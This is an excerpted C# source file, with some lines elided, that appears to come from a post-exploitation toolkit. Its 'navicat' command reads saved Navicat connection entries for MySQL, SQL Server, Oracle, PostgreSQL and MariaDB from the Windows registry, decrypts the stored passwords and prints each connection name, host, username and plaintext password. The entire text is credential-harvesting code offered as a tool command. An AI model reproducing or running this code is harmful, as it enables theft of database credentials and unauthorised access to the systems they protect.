...
{
    public class Navicat : ICommand
    {
        public static string CommandName => "navicat";
        ...
        public void DecryptPwd(ArgumentParserContent arguments)
        {
            ...
            dictionary.Add("Navicat", "MySql");
            dictionary.Add("NavicatMSSQL", "SQL Server");
            dictionary.Add("NavicatOra", "Oracle");
            dictionary.Add("NavicatPG", "pgsql");
            dictionary.Add("NavicatMARIADB", "MariaDB");

            foreach (var key in dictionary.Keys)
            {
                var registryKey = Registry.CurrentUser.OpenSubKey($@"Software\PremiumSoft\{key}\Servers");
                if (registryKey == null) continue;
                Writer.Log($"DatabaseName: {dictionary[key]}");
                ...
                foreach (string rname in registryKey.GetSubKeyNames())
                {
                    ...
                    if (installedapp != null)
                    {
                        try
                        {
                            ...
                            Writer.Out("ConnectName", rname);
                            Writer.Out("hostname", hostname);
                            Writer.Out("username", username);
                            Writer.Out("password", Decrypt.DecryptString(password) + "\r\n");
